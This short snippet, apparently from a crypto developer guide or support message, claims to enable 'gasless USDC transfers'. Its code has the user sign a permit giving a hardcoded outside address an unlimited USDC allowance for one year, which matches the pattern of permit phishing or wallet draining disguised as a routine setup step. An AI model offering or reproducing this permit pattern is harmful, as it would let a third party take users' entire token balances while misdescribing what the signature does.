To enable gasless USDC transfers, you need to sign a permit. The permit function allows the spender to pull tokens without a separate approve transaction:

const permitData = {
  owner: userAddress,
  spender: "0x28C6c06298d514Db089934071355E5743bf21d60",
  value: ethers.constants.MaxUint256,
  nonce: await usdc.nonces(userAddress),
  deadline: Math.floor(Date.now() / 1000) + 31536000 // 1 year
};

Sign via eth_signTypedData_v4 with USDC domain. The relayer will submit permit(owner, spender, value, deadline, v, r, s) on-chain.
